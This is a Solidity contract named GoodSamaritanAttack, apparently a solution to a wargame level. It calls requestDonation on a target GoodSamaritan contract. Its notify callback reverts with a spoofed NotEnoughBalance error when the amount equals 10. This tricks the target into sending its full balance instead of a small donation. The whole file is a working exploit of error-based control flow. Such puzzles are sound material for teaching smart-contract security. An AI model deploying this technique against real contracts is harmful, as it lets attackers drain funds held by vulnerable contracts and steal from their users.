// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract GoodSamaritanAttack is INotifyable {

    error NotEnoughBalance();

    function attack(address _GoodSamaritan) public {
        GoodSamaritan(_GoodSamaritan).requestDonation();
    }

    function notify(uint256 amount) pure external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
